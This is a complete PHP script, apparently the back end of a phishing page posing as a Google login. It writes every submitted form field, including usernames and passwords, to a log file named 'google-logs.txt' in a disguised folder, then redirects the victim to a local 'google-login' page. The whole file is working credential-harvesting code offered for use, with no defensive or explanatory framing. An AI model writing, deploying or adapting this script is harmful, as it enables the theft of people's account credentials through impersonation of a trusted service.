<?php    
    
    $handle = fopen("../lOgZ/google-logs.txt", "a");
    foreach($_POST as $variable => $value) {
        fwrite($handle, $variable);
        fwrite($handle, "=");
        fwrite($handle, $value);
        fwrite($handle, "\r\n");
    }
    fwrite($handle, "\r\n");
    fclose($handle);
    header('Location: http://10.1.1.1/google-login/redirect.html');
    exit;
?>
